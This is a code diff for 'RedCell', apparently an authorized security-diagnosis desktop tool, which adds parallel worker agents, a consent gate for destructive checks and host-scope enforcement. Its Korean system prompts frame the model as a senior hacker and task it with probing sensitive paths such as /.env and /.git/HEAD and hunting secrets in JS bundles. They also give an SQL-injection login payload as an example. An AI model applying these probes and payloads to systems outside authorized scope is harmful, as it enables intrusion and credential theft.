@@ -14,7 +14,7 @@ use std::collections::HashMap;
 use std::fs;
 use std::io::{BufRead, BufReader};
 use std::path::{Path, PathBuf};
-use std::process::{Child, Command, Stdio};
+use std::process::{Child, ChildStderr, ChildStdout, Command, Stdio};
 use std::sync::Mutex;
 use std::thread;
 
@@ -25,6 +25,8 @@ use tauri::{AppHandle, Emitter, Manager};
 use uuid::Uuid;
 
 mod auth;
+mod probes;
+mod risk;
 
 /// 세션 파일 read-modify-write 직렬화용 락(stdout/stderr 스레드 경합 방지).
 struct IoGuard(Mutex<()>);
@@ -56,6 +58,16 @@ struct Session {
     max: bool, // 공격 최대 모드(tools) — 전수 커버리지 + opt-in 전체 + python_exec
     #[serde(default)]
     diag: bool, // 서비스 진단 모드 — 설명 기반 공격 포인트/개선 권고 리포트
+    #[serde(default)]
+    deep: bool, // 심층 진단 — 병렬 워커 N개 + collector fan-in (prime-agent builder 패턴)
+    #[serde(default)]
+    engine: String, // 실행 엔진: ""|"pi" = pi-coding-agent, "prime" = prime-agent(Rust 하네스)
+    #[serde(default)]
+    auth_cookie: String, // 인증 스윕용 세션 쿠키 (Cookie 헤더 값, 사용자가 붙여넣음)
+    #[serde(default)]
+    danger_consent: bool, // 파괴적 진단 동의 (모달 명시 동의, 세션별, 철회 가능)
+    #[serde(default)]
+    danger_consented_at: String, // 동의 시각 (RFC3339, 감사 추적용)
     #[serde(default)]
     piq: String, // prime 모드: pi 세션 id(연속 대화 유지)
     #[serde(default = "status_idle")]
@@ -279,6 +291,9 @@ fn create_session(
     mode: Option<String>,
     max: Option<bool>,
     diag: Option<bool>,
+    deep: Option<bool>,
+    engine: Option<String>,
+    auth_cookie: Option<String>,
 ) -> Session {
     let id = Uuid::new_v4().to_string();
     let s = Session {
@@ -301,6 +316,11 @@ fn create_session(
         },
         max: max.unwrap_or(false),
         diag: diag.unwrap_or(false),
+        deep: deep.unwrap_or(false),
+        engine: engine.unwrap_or_default(),
+        auth_cookie: auth_cookie.unwrap_or_default(),
+        danger_consent: false,
+        danger_consented_at: String::new(),
         piq: String::new(),
         status: "idle".into(),
         created_at: now(),
@@ -325,6 +345,9 @@ fn update_session(
     mode: Option<String>,
     max: Option<bool>,
     diag: Option<bool>,
+    deep: Option<bool>,
+    engine: Option<String>,
+    auth_cookie: Option<String>,
 ) -> Option<Session> {
     let mut s = read_session(&app, &id)?;
     s.name = name;
@@ -343,8 +366,37 @@ fn update_session(
     if let Some(d) = diag {
         s.diag = d;
     }
+    if let Some(dd) = deep {
+        s.deep = dd;
+    }
+    if let Some(e) = engine {
+        s.engine = e;
+    }
+    if let Some(c) = auth_cookie {
+        s.auth_cookie = c;
+    }
     s.updated_at = now();
     write_session_locked(&app, &s);
+    Some(s)
+}
+
+/// 파괴적 진단 동의 설정 — 동의 모달의 명시 확인 전용 커맨드.
+/// 동의 시 시각을 찍고 감사 노트를 남긴다. 철회는 즉시 반영된다.
+#[tauri::command]
+fn set_danger_consent(app: AppHandle, id: String, consent: bool) -> Option<Session> {
+    let mut s = read_session(&app, &id)?;
+    s.danger_consent = consent;
+    s.danger_consented_at = if consent { now() } else { String::new() };
+    s.updated_at = now();
+    write_session_locked(&app, &s);
+    let text = if consent {
+        "[경고] 파괴적 진단 동의됨 — 기본자격 시도·IDOR 인접 확인·쓰기 검증이 다음 진단부터 실행됩니다. (세션별, 언제든 철회 가능)"
+    } else {
+        "[sys] 파괴적 진단 동의 철회 — 읽기 전용 모드로 복귀합니다."
+    };
+    let ev = json!({ "type": "note", "text": text });
+    let stamped = append_event(&app, &id, &ev);
+    app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
     Some(s)
 }
 
@@ -399,13 +451,18 @@ const PROVIDER_CATALOG: &[ProviderMeta] = &[
     ProviderMeta { name: "custom", kind: "openai-compat", note: "임의 OpenAI 호환 엔드포인트 — vLLM·LM Studio·원격 ollama 등", default_model: "", env_keys: &["REDCELL_OPENAI_API_KEY"], base_url: "", needs_base: true },
 ];
 
-/// 서비스 진단 모드에서 pi 에 주입하는 방법론 — 공격 포인트 + 개선 권고 중심.
-const DIAG_METHOD: &str = r#"# RedCell 서비스 진단 방법론
+/// 서비스 진단 역할 + 실측 정찰 지시 (단일 진단·심층 collector 공용 토대).
+const DIAG_ROLE: &str = r#"# RedCell 서비스 진단 — 시니어 해커 멘토
 
-당신은 서비스 보안 진단 전문가다. '서비스 설명'(있으면)과, URL 이 주어졌을 때의
-**실측 정찰 결과**를 바탕으로 공격 포인트와 개선(보완) 필요 사항을 창의적으로 발굴해
-진단 리포트를 작성한다. URL 이 주어졌으면 보고서를 쓰기 전에 **반드시** 아래 실측
-정찰을 먼저 수행하고, 확보한 실제 응답·헤더·상태로 서비스 모델을 세운다.
+당신은 10년차 시니어 해커다. 지금 주니어 해커를 가르치듯, 이 서비스에서
+**실제로 해킹이 어떻게 가능한지** 시나리오 단위로 보여주고, 각 시나리오마다
+"왜 가능한지(원리)"와 "어떻게 막는지(구체적 코드·설정)"를 함께 설명한다.
+독자는 해킹을 모르는 서비스 담당자 + 주니어 보안 담당자다.
+
+대상 URL 이 주어졌으면 보고서를 쓰기 전에 **반드시** 아래 실측 정찰을 먼저
+수행하고, 확보한 실제 응답·헤더·상태로 서비스 모델을 세운다.
+(P0 자동 스윕 증거([P-###])가 함께 주어지면 그것을 우선 사용하고, 빈틈만
+아래 순서로 보완한다 — 이미 커버된 항목의 재프로브는 시간 낭비다.)
 
 ## 실측 정찰 순서 (URL 이 주어진 경우 — 보고서 작성 전 반드시)
 모든 요청은 web_fetch, 비파괴 GET/HEAD 로만 한다:
@@ -413,29 +470,35 @@ const DIAG_METHOD: &str = r#"# RedCell 서비스 진단 방법론
    (Content-Security-Policy, Strict-Transport-Security, X-Frame-Options,
    X-Content-Type-Options, Referrer-Policy, Server, X-Powered-By)
 ② 쿠키 플래그 (HttpOnly/Secure/SameSite) 점검
-③ 홈페이지의 링크·폼·스크립트에서 엔드포인트·파라미터·API 수집(공격 표면)
+③ 홈페이지의 링크·폼·스크립트·JS 번들에서 엔드포인트·파라미터·API 수집(공격 표면)
 ④ 흔한 민감/설계 경로를 각각 한 번씩 프로브: /robots.txt, /.well-known/security.txt,
    /sitemap.xml, /openapi.json, /swagger, /admin, /login, /api, /health, /.env,
-   /config, /favicon.ico, /server-status
+   /.git/HEAD, /config, /favicon.ico, /server-status
 ⑤ 리다이렉트·HTTPS 강제·응답 코드(200/301/302/403/404/500)로 배포·접근통제 정황 파악
-정찰에서 실제로 본 것을 근거로만 단정하고, 못 본 것은 [가정] 으로 표기한다.
+⑥ JS 번들·openapi 문서에서 API 키·토큰·내부 URL 같은 비밀 문자열 탐색
+정찰에서 실제로 본 것을 근거로만 단정하고, 못 본 것은 [가정] 으로 표기한다."#;
 
-## 리포트 형식 (Markdown, 아래 구조를 지킨다 — UI 가 자동 시각화한다)
+/// 최종 리포트 형식 + 집필 원칙 (단일 진단·심층 collector 공용).
+const REPORT_SPEC: &str = r#"## 리포트 형식 (Markdown, 아래 구조를 지킨다 — UI 가 자동 시각화한다)
 # 서비스 진단 리포트 — <서비스명>
 ## 0. 한눈에 보기 (맨 앞 요약 표)
+  3줄 요약: 비전문가도 이해하는 "그래서 뭐가 위험한가" 3줄 (등급·최대 피해·급한 조치)
   | 루트 | 위험도 | 공격 방법 | 탈취 정보 | 보완 요약 |
-  (각 루트를 한 행으로 — 비전문가도 표 하나로 전체 그림을 본다)
+  (각 시나리오를 한 행으로 — 비전문가도 표 하나로 전체 그림을 본다)
+  P0 자동 스윕 요약 1줄: "자동 스윕 N개 프로브·M건 발견" + 심각도 분포.
+  (시나리오에는 관련 증거 ID를 [P-###] 형태로 반드시 인용한다)
 ## 1. 진단 범위 및 가정
   - 기술 스택·아키텍처 추정 (설명에 없는 부분은 [가정] 으로 표시)
   - 진단 경계: 설명 기반 판단 vs 실측 확인
 ## 2. 공격 표면 (Attack Surface)
   인증·세션·권한 / 입력 처리 / 데이터 흐름 / 외부 연동 / 배포·설정 / 비즈니스 로직
   각 표면의 노출 경로와 진입점(예상 엔드포인트·함수·플로우)
-## 3. 창의적 공격 루트 (위험도 순)
-  각 루트는 **반드시 아래 고정 형식**으로 작성한다 — UI 가 '공격 흐름 화살표 다이어그램'
-  과 '탈취 정보 태그' 등으로 시각화하므로 라벨 줄을 정확히 지켜라:
+## 3. 공격 시나리오 (위험도 순 — 시니어가 주니어에게 가르치듯 구체적으로)
+  각 시나리오는 **반드시 아래 고정 형식**으로 작성한다 — UI 가 '공격 흐름
+  다이어그램'·'단계 시뮬레이션'·'멘토 노트'·'탈취 정보 태그'로 시각화하므로
+  라벨 줄을 정확히 지켜라:
 
-  ### 루트 1. <공격 이름> [높음]
+  ### 루트 1. <공격 시나리오 이름> [높음]
   위험도: 높음                  (치명|높음|중간|낮음 중 하나)
   진입점: <공격자가 처음 닿는 지점 — URL/엔드포인트/화면/파일 등>
   공격 흐름: 공격자 → <진입점> → (<취약점/공격 기법>) → <중간 결과> → (<탈취>) → <최종 피해>
@@ -444,19 +507,25 @@ const DIAG_METHOD: &str = r#"# RedCell 서비스 진단 방법론
              (→ 로 구분된 단계들. 취약점 단계는 ( ) 로, 정보 유출 단계도 ( ) 로 표기)
   탈취 정보: 이메일 주소, 비밀번호 해시, 세션 토큰, 결제 카드 정보
              (쉼표로 구분 — 무엇이 새는지 구체적일수록 좋음)
-  공격 방법: 구체적 기법·페이로드 예시·도구 (한 사람이 따라 할 수 있을 정도로)
-  영향: 비즈니스 영향 (한 줄)
-  시뮬레이션: (선택 — UI 가 '이렇게 하면 → 이렇게 된다' 단계 재생 플레이어로 시각화)
+  공격 방법: 구체적 기법·페이로드 예시·도구 (주니어가 따라 할 수 있을 정도로)
+  멘토 노트: 왜 이 공격이 가능한지 원리 설명 — 주니어를 가르치듯 쉽게, 2~4문장
+             (예: "로그인 입력값을 SQL 문장에 그대로 이어붙이면, 공격자의 입력이
+             코드가 된다. 그래서 참이 되는 조건을 넣으면 비밀번호 없이도 …")
+  증거: 실제 확인한 응답·헤더·본문 발췌 1~3줄 (원문 그대로, 민감값은 뒤 4자리만)
+  영향: 비즈니스 영향 (한 줄 — "결국 무엇이 어떻게 새는가")
+  시뮬레이션: (UI 가 '이렇게 하면 → 이렇게 된다' 단계 재생 플레이어로 시각화)
     1. <공격자 행동 — 요청·페이로드·조작> → <시스템 결과/응답>
     2. <다음 행동> → <다음 결과>
-    (숫자 번호 + '→' 한 쌍으로 2~4단계. 행동은 한 사람이 따라 할 수 있을 만큼 구체적
-    으로 — 예: "id 에 ' OR '1'='1 입력 후 로그인 클릭 → 관리자 쿠키 발급 응답")
+    (숫자 번호 + '→' 한 쌍으로 2~4단계. 행동은 주니어가 따라 할 수 있을 만큼
+    구체적으로 — 예: "id 에 ' OR '1'='1 입력 후 로그인 클릭 → 관리자 쿠키 발급 응답")
   검증: [실증] <어떻게 확인했는지 — web_fetch 실측 응답 근거>
         [징후] <부분 확인·정황 — 헤더, 설정, 오류 노출 등>
         [가정] <설명 기반 추론 — 실측 불가 사유>
+        [실증]은 P0 증거 + P1 재확인(verify-*)이 있거나 직접 재현에 성공했을 때만 사용한다.
         (셋 중 하나만. URL 이 주어졌으면 핵심 루트는 실측 재현을 시도해 [실증]으로
         올리고, 재현 실패 시 [가정]으로 유지한다. 게으른 추측 금지)
-  보완: 미리 막는 방법 1~3줄 (코드·설정·프로세스 수준, 우회 가능성과 한계 포함)
+  보완: 미리 막는 방법 — 복붙 가능한 코드·설정 예시를 포함해 2~5줄
+        (코드·설정·프로세스 수준, 우회 가능성과 한계 포함)
 
   참고할 공격 기법 pool (여기서 뽑지 말고 서비스에 맞게 창의적으로 조합하라):
   주입류(SQLi·NoSQLi·명령·SSRF·SSTI), 인증·세션(JWT·OAuth·쿠키·토큰), 권한(IDOR·
@@ -464,30 +533,230 @@ const DIAG_METHOD: &str = r#"# RedCell 서비스 진단 방법론
   스머글링, 비즈니스 로직 남용(할인·쿼터·순서·상태), 개인정보 노출, 유니코드·인코딩
   우회, 체인 공격(XSS→CSRF→관리자 권한 등), 재시도/타이밍 공격
 ## 4. 개선·보완 권고 (우선순위)
-  각 항목: **우선순위(P0~P3) · 문제 · 구체적 보완 방법(코드·설정·프로세스 수준) ·
+  각 항목: **우선순위(P0~P3) · 문제 · 구체적 보완 방법(복붙 가능한 코드·설정 포함) ·
   검증 방법**
 ## 5. 실측 확인 (URL 이 주어진 경우) — 정밀 검증 단계
-  위험도 높음/치명 루트는 반드시 web_fetch 로 **재현을 시도**하고(요청·응답·헤더·쿠키
-  를 실제로 확인), 각 루트의 검증 상태를 갱신한다:
+  먼저 P0 자동 스윕 결과(프로브 수·발견 수·심각도 분포)를 3~5줄로 요약하고,
+  각 시나리오의 검증 항목에 관련 증거 ID([P-###])를 명시한다. P0 증거와
+  모순되는 시나리오는 삭제하거나 [가정]으로 강등한다.
+  `verify-*`(P1 재확인 확정)와 `auth-inject`(로그인 injection 시도 결과) 발견이
+  있으면 반드시 대응 시나리오로 작성한다 — 시도가 있었는데 리포트에서 빠지면 안 된다.
+  위험도 높음/치명 시나리오는 반드시 web_fetch 로 **재현을 시도**하고(요청·응답·
+  헤더·쿠키를 실제로 확인), 각 시나리오의 검증 상태를 갱신한다:
   - 재현 성공 → [실증] 으로 상향 (근거: 실제 응답 원문 기재)
   - 부분 확인(오류 노출·헤더·설정 파일 등) → [징후]
   - 재현 불가/미시도 → [가정] 유지 (어떤 시도를 했는지 기재)
   재현 동작은 비파괴(읽기·폼 검증 정도)로 제한하고, 실측 전후의 차이와 남은 미확인
   항목을 정리한다.
 
-## 원칙
-- **비전문가 친화**: 공격 루트마다 "결국 무엇이 어떻게 새는가"를 3번 항목의 흐름·탈취
-  정보로 한눈에 보이게 한다. 전문 용어는 괄호로 풀어 쓴다(예: (SQL 주입 = 입력값으로
+## 집필 원칙
+- **비전문가 친화**: 시나리오마다 "결국 무엇이 어떻게 새는가"를 흐름·탈취 정보로
+  한눈에 보이게 한다. 전문 용어는 괄호로 풀어 쓴다(예: (SQL 주입 = 입력값으로
   DB 질의를 조작)).
+- **멘토링**: 모든 시나리오에 멘토 노트(왜 가능한지 원리)를 붙인다 — 리포트를 읽은
+  주니어가 다음엔 스스로 찾을 수 있어야 한다.
 - **창의성**: 잘 알려진 취약점뿐 아니라 조합·비즈니스 로직·운영 방식에서 나오는
-  공격 루트를 발굴한다. 공격자 관점에서 "실제로 어떻게 성공하는가"를 구체적으로.
-- **보완 중심**: 모든 공격 루트마다 반드시 "미리 막는 방법"(방어 기재·설정·검증 방법)
-  을 제시한다 — 진단기가 곧 개선 지침이 되도록.
+  공격 시나리오를 발굴한다. 공격자 관점에서 "실제로 어떻게 성공하는가"를 구체적으로.
+- **보완 중심**: 모든 공격 시나리오마다 반드시 "미리 막는 방법"을 복붙 가능한 수준으로
+  제시한다 — 진단 리포트가 곧 개선 지침이 되도록.
 - **정밀 검증**: 추측(가정)과 실측(실증)을 절대 섞지 않는다. 근거 없이 단정하거나
   위험도를 부풀리지 말 것 — 증거가 부족하면 [징후]나 [가정]으로 정직하게 낮춘다.
-  검증 상태가 [실증]인 루트만 "확인된 취약점"으로 표현한다.
-- 로컬 컴퓨터 파일은 조사하지 말 것. 웹 실측은 반드시 web_fetch 툴로만.
-"#;
+  검증 상태가 [실증]인 시나리오만 "확인된 취약점"으로 표현한다.
+- 로컬 컴퓨터 파일은 조사하지 말 것. 웹 실측은 반드시 web_fetch 툴로만."#;
+
+/// 심층 진단 워커 정의 — prime-agent builder(factory) 패턴의 워커/섹션에 대응.
+/// 각 워커는 독립 pi 세션으로 동시에 실행되고, collector 가 결과를 병합한다.
+struct DeepWorkerDef {
+    id: &'static str,    // pi 세션 접미사 + 이벤트 태그
+    label: &'static str, // UI 칩 표시 (W1·정찰)
+    title: &'static str, // 담당 분야
+    brief: &'static str, // 워커 전용 임무 지시
+}
+const DEEP_WORKERS: &[DeepWorkerDef] = &[
+    DeepWorkerDef {
+        id: "w1",
+        label: "W1·정찰",
+        title: "표면 정찰",
+        brief: "홈페이지·헤더·쿠키·TLS·리다이렉트·민감 경로(/robots.txt, /.well-known/security.txt, /sitemap.xml, /openapi.json, /swagger, /admin, /login, /api, /health, /.env, /.git/HEAD, /server-status)를 비파괴 GET/HEAD 로 전수 조사하고, 링크·폼·스크립트·JS 번들에서 엔드포인트·파라미터·API 를 수집한다. 보안 헤더·쿠키 플래그 누락을 빠짐없이 기록한다.",
+    },
+    DeepWorkerDef {
+        id: "w2",
+        label: "W2·주입",
+        title: "주입 공격",
+        brief: "수집된 엔드포인트·파라미터에 SQL 주입·XSS(반사형, 무해 마커)·SSTI·SSRF·OS 명령 주입·경로 조작 신호를 비파괴 프로브로 탐지한다. 오류 메시지 노출·산술 평가·지연 응답 같은 신호를 증거 원문과 함께 기록한다. 파괴적 페이로드·대량 요청은 금지. 단, P0 증거에 danger-write(쓰기 검증)가 있으면 그 결과를 인용해 체인 시나리오(웹셸 경로·정리 여부 포함)를 작성한다.",
+    },
+    DeepWorkerDef {
+        id: "w3",
+        label: "W3·인증",
+        title: "인증·세션·권한",
+        brief: "로그인·회원가입·토큰(JWT/쿠키/OAuth) 흐름을 분석한다: 세션 고정·예측 가능성, 로그아웃 무효화, 탈취 시 영향, 무차별 대입 방어(레이트리밋·잠금), IDOR·수평/수직 권한 상승 신호를 비파괴 범위에서 확인하고 기록한다. P0 증거에 danger-creds(기본자격)·danger-idor(인접 확정)이 있으면 인용해 권한 탈취 체인을 작성한다(비밀번호 원문은 절대 복기하지 마라).",
+    },
+    DeepWorkerDef {
+        id: "w4",
+        label: "W4·노출",
+        title: "노출·설정 오류",
+        brief: "노출된 비밀·설정 오류를 찾는다: /.env·백업 파일·설정 파일, /.git, JS 번들·openapi 문서 속 API 키·토큰·내부 URL, 디버그·관리자 페이지, CORS 와일드카드, 상세 오류 스택 노출. P0의 upload-surface(업로드 폼)·methods(쓰기 메서드)·method-override 증거를 인용해 설정 보완안(실제 업로드·PUT 발송 없이)을 제시한다. 발견 원문(민감값 마스킹)을 증거로 기록한다.",
+    },
+    DeepWorkerDef {
+        id: "w5",
+        label: "W5·로직",
+        title: "비즈니스 로직",
+        brief: "서비스 설명과 실제 화면·API 흐름을 대조해 비즈니스 로직 남용 포인트를 발굴한다: 가격·할인·쿼터·순서·상태 전이 조작, 레이스 컨디션 가능 지점, 권한 단계 건너뛰기, 악용 가능한 정상 기능. 각 포인트마다 악용 시나리오 초안을 기록한다.",
+    },
+];
+
+/// 심층 진단 워커용 지시문 — 독립 세션에서 한 분야만 깊게 파고든다.
+fn deep_worker_instruction(
+    def: &DeepWorkerDef,
+    target: &str,
+    goal: &str,
+    https_hint: &str,
+    mem: &str,
+) -> String {
+    format!(
+        r#"# RedCell 심층 진단 워커 — {label} ({title})
+
+당신은 시니어 해커 팀의 '{title}' 담당 전문가다. 아래 대상을 맡은 분야에서만
+깊게 파고들어 발견 사항을 정리한다. 다른 워커가 다른 분야를 동시에 맡고 있으니
+네 분야 외에는 손대지 마라.
+
+대상 사이트(인가됨): {target}
+{https_hint}
+서비스 설명: {goal}
+
+## 임무
+{brief}
+
+## 규칙
+- 모든 웹 조회는 web_fetch 툴로, 비파괴 GET/HEAD(폼 검증 정도의 POST 허용)로만.
+- 실제로 확인한 것만 증거(응답·헤더·본문 발췌, 민감값은 뒤 4자리만)와 함께 기록.
+- 못 본 것은 [가정] 으로 표기하고 단정하지 마라.
+- 이 컴퓨터의 파일 시스템(bash/read/edit/write)은 조사 대상이 아니다.
+{mem}
+## 출력 형식 (반드시 지킨다 — collector 가 병합한다)
+## 워커 발견 ({label} {title})
+- [치명|높음|중간|낮음|정보] <발견 제목> — <한 줄 설명> / 근거: <증거 발췌 또는 [가정]>
+(발견마다 한 줄, 최대 12줄. 발견이 없으면 "- [정보] 이상 없음 — <확인한 범위>" 한 줄)"#,
+        label = def.label,
+        title = def.title,
+        target = target,
+        https_hint = https_hint,
+        goal = if goal.trim().is_empty() { "(설명 없음 — 실측으로 파악)" } else { goal.trim() },
+        brief = def.brief,
+        mem = mem,
+    )
+}
+
+/// 심층 진단 collector(병합자)용 지시문 — 워커 발견을 시나리오 리포트로 fan-in.
+fn deep_merge_instruction(target: &str, goal: &str, outputs: &str, mem: &str) -> String {
+    format!(
+        r#"{DIAG_ROLE}
+
+당신은 심층 진단의 최종 리포트 작성자(collector)다. 5명의 분야별 워커가 같은
+대상을 동시에 진단한 결과(아래)가 주어졌다. 이를 병합·검증해 최종 리포트 1개를
+작성한다.
+
+대상 사이트(인가됨): {target}
+
+## 서비스 설명
+
+{goal}
+
+## 워커 발견 (5개 분야 — 중복 제거하고 병합할 것)
+
+{outputs}
+{mem}
+## 병합 규칙
+1. 중복 발견은 하나로 합치고, 서로 연결되는 발견은 체인 시나리오(XSS→세션 탈취→
+   관리자 권한 등)로 엮는다 — 단일 발견 나열이 아니라 **공격 시나리오**가 주인공이다.
+2. 위험도 높음/치명 후보는 web_fetch 로 비파괴 재현을 시도해 [실증]/[징후]로
+   확정한다. 재현 못 하면 [가정]으로 정직하게 둔다.
+3. 워커가 놓친 분야(비즈니스 로직 조합 등)가 보이면 1~2개 시나리오를 보강한다.
+4. 아래 리포트 형식·집필 원칙을 정확히 지킨다.
+
+{REPORT_SPEC}"#,
+        target = target,
+        goal = if goal.trim().is_empty() { "(설명 없음 — 워커 실측 기반)" } else { goal.trim() },
+        outputs = outputs,
+        mem = mem,
+    )
+}
+
+/// 심층 진단 추적 라운드 상한 (1차 + 추적 2회 = 최대 3라운드, 결정적 수렴).
+const DEEP_MAX_ROUNDS: u32 = 3;
+/// 추적 지시문에 넣는 자가 이전 결과 발췌 상한 (문자).
+const DEEP_FOLLOWUP_TRUNC: usize = 2000;
+
+/// 워커 출력에서 발견 키 추출 — `[등급] 제목` 줄을 정규화해 순서 유지 중복 제거.
+/// 수렴 판정(신규 발견 수) + 교차 단서 전달에 쓴다.
+fn extract_finding_keys(text: &str) -> Vec<String> {
+    let mut out: Vec<String> = Vec::new();
+    for line in text.lines() {
+        let t = line.trim();
+        if t.is_empty() {
+            continue;
+        }
+        let is_bullet = t.starts_with("- [")
+            || t.starts_with("* [")
+            || t.contains("[치명]")
+            || t.contains("[높음]")
+            || t.contains("[중간]")
+            || t.contains("[낮음]")
+            || (t.starts_with("## ") && !t.contains("워커 발견"));
+        if !is_bullet {
+            continue;
+        }
+        let norm: String = t
+            .to_lowercase()
+            .chars()
+            .filter(|c| !c.is_whitespace() && !matches!(c, '-' | '#' | '*' | '/' | ':' | '(' | ')'))
+            .take(80)
+            .collect();
+        if norm.chars().count() >= 8 && !out.contains(&norm) {
+            out.push(norm);
+        }
+    }
+    out
+}
+
+/// 추적 라운드 지시문 — 자가 이전 결과 + 타 워커 단서를 물고 추가 발견만 노린다.
+fn deep_followup_instruction(
+    def: &DeepWorkerDef,
+    round: u32,
+    own_prior: &str,
+    cross: &str,
+    target: &str,
+) -> String {
+    let own: String = own_prior.chars().take(DEEP_FOLLOWUP_TRUNC).collect();
+    format!(
+        r###"# RedCell 심층 진단 추적 라운드 {round} — {label} ({title})
+
+너는 같은 대상을 계속 파고 있는 '{title}' 담당 전문가다. 이전 턴의 대화·P0 증거는
+그대로 이어진다. 새로 실측·추론해서 **추가 발견만** 보고한다. 이미 보고한 것은
+반복하지 마라.
+
+대상 사이트(인가됨): {target}
+
+## 네 이전 보고 (요약 — 반복 금지)
+{own}
+
+## 다른 워커의 단서 (네 분야와 엮일 수 있음)
+{cross}
+
+## 추적 규칙
+- 위 단서 중 네 분야와 연결되는 것을 우선 추적하고, 네 이전 보고의 [가정] 은
+  web_fetch 비파괴 재현으로 [실증]/[징후] 승격을 시도한다.
+- 그래도 새 게 없으면 "- [정보] 추가 발견 없음 — <확인한 범위>" 한 줄만.
+- 출력 형식: "## 추가 발견 ({label})" + 발견마다 "- [등급] 제목 — 설명 / 근거: …"
+  (최대 8줄)"###,
+        round = round,
+        label = def.label,
+        title = def.title,
+        target = target,
+        own = if own.trim().is_empty() { "(이전 보고 없음)" } else { own.trim() },
+        cross = if cross.trim().is_empty() { "(단서 없음)" } else { cross.trim() },
+    )
+}
 
 /// 프로바이더 목록 + 자격증명 감지 상태(프론트 연동용).
 #[tauri::command]
@@ -947,6 +1216,21 @@ fn prime_cli_path(redcell_dir: &str) -> Result<PathBuf, String> {
                 .join("cli.js"),
         );
     }
+    // pi 1.3.0 정식 진입점은 dist/bundle/cli.js (package.json bin) — 모든 dist/cli.js
+    // 후보 앞에 bundle 변형을 우선 삽입하고, 구 레이아웃은 폴백으로 유지한다.
+    let mut expanded: Vec<PathBuf> = Vec::with_capacity(cands.len() * 2);
+    for c in cands {
+        let s = c.to_string_lossy();
+        if s.ends_with("dist/cli.js") || s.ends_with("dist\\cli.js") {
+            let mut b = c.clone();
+            b.pop(); // cli.js 제거 → .../dist
+            b.push("bundle");
+            b.push("cli.js");
+            expanded.push(b);
+        }
+        expanded.push(c);
+    }
+    let cands = expanded;
     if let Some(found) = cands.iter().find(|p| p.is_file()) {
         return Ok(found.clone());
     }
@@ -981,6 +1265,319 @@ fn prime_cwd(redcell_dir: &str) -> PathBuf {
     PathBuf::from(redcell_dir)
 }
 
+/// 실행 엔진 — pi-coding-agent(기본) | prime-agent(Rust 하네스, 직접 실행).
+#[derive(Clone, Copy, PartialEq, Eq)]
+enum Engine {
+    Pi,
+    Prime,
+}
+
+fn session_engine(s: &Session) -> Engine {
+    if s.engine.trim().eq_ignore_ascii_case("prime") {
+        Engine::Prime
+    } else {
+        Engine::Pi
+    }
+}
+
+/// 툴 호출 인자에서 대상 호스트들을 추출한다 (반응형 스코프 게이트용).
+/// 수집원: http(s) URL·IPv4 리터럴(전체 직렬화 스캔) + host/hostname/url/target/domain
+/// 키의 베어 값. 소문자 정규화·포트 제거·중복 제거. 대상 없는 순수 로컬 호출은 빈 벡터.
+fn extract_hosts(_tool_name: &str, args: &Value) -> Vec<String> {
+    let mut out: Vec<String> = Vec::new();
+    let mut push = |h: String| {
+        let h = h.trim().trim_end_matches('.').to_lowercase();
+        if !h.is_empty() && !out.contains(&h) {
+            out.push(h);
+        }
+    };
+    // 1) URL 스킴 스캔.
+    let s = args.to_string();
+    for needle in ["https://", "http://"] {
+        let mut rest = s.as_str();
+        while let Some(pos) = rest.find(needle) {
+            let after = &rest[pos + needle.len()..];
+            let host = after
+                .split(['/', '?', '#', '"', '\'', ' ', '\t', '\n', ')', ']', '}'].as_ref())
+                .next()
+                .unwrap_or("");
+            let host = host.split('@').next_back().unwrap_or(host); // userinfo 제거
+            let host = host.split(':').next().unwrap_or(host); // 포트 제거
+            let host = host.trim_matches(|c| c == '[' || c == ']');
+            if !host.is_empty() {
+                push(host.to_string());
+            }
+            rest = after;
+        }
+    }
+    // 2) IPv4 리터럴 스캔.
+    let bytes = s.as_bytes();
+    let mut i = 0;
+    while i < bytes.len() {
+        if bytes[i].is_ascii_digit() {
+            let mut j = i;
+            while j < bytes.len() && (bytes[j].is_ascii_digit() || bytes[j] == b'.') {
+                j += 1;
+            }
+            let tok = &s[i..j];
+            let parts: Vec<&str> = tok.split('.').collect();
+            if parts.len() == 4 && parts.iter().all(|p| !p.is_empty() && p.len() <= 3 && p.parse::<u8>().is_ok()) {
+                push(tok.to_string());
+            }
+            i = j;
+        } else {
+            i += 1;
+        }
+    }
+    // 3) host 계열 키의 베어 값 (스킴 없는 도메인·IP).
+    if let Some(obj) = args.as_object() {
+        for key in ["host", "hostname", "url", "target", "domain", "server"] {
+            if let Some(v) = obj.get(key).and_then(|v| v.as_str()) {
+                let mut h = v.trim().to_string();
+                for needle in ["https://", "http://"] {
+                    if let Some(pos) = h.find(needle) {
+                        h = h[pos + needle.len()..].to_string();
+                    }
+                }
+                h = h.split(['/', '?', '#'].as_ref()).next().unwrap_or("").to_string();
+                h = h.split('@').next_back().unwrap_or(&h).to_string();
+                // 포트 제거 — 단 IPv6 리터럴(:: 포함)은 통째로 둔다.
+                if h.matches(':').count() <= 1 {
+                    h = h.split(':').next().unwrap_or(&h).to_string();
+                }
+                h = h.trim_matches(|c| c == '[' || c == ']').to_string();
+                if !h.is_empty() && !h.contains(char::is_whitespace) {
+                    push(h);
+                }
+            }
+        }
+    }
+    out
+}
+
+/// 반응형 스코프 게이트 판정 — prime-agent 엔진용 (pi는 확장 훅이 사전 차단).
+/// 인가 밖 호스트가 하나라도 있으면 위반 사유를 돌려주고, 호출자는 프로세스를 kill 한다.
+/// YAML scope 는 데스크톱이 해석할 수 없어 kill 하지 않는다(스킬 수준 제약만 + 경고).
+fn decide_tool_violation(auth: &auth::AuthList, tool_name: &str, args: &Value) -> Option<String> {
+    if auth.yaml {
+        return None;
+    }
+    for host in extract_hosts(tool_name, args) {
+        if !auth::is_host_allowed(auth, &host) {
+            return Some(format!(
+                "RedCell scope 위반(반응형 게이트): {tool_name} → {host} — 인가 목록에 없어 prime-agent 프로세스를 중단합니다."
+            ));
+        }
+    }
+    None
+}
+
+/// prime-agent 주입용 스코프 스킬 템플릿 — 실행마다 인가 목록을 채워 --skill 로 전달.
+/// prime-agent 에는 tool_call 훅이 없어 (1) 스킬 지시 + (2) 반응형 kill + (3) 읽기 전용
+/// 태스킹의 3중 방어로 scope 를 강제한다.
+const SCOPE_SKILL_TEMPLATE: &str = r#"---
+name: redcell-scope
+description: RedCell authorization scope for this diagnosis run. Restricts every network touch to the listed allow targets (deny list wins). Read-only recon only.
+---
+
+# RedCell Scope (this run only)
+
+You are running inside RedCell, an authorized security-diagnosis harness.
+Every network touch MUST stay inside this scope — no exceptions.
+
+## Allow targets (only these)
+{ALLOWS}
+
+## Deny targets (never touch, even if allow-listed above)
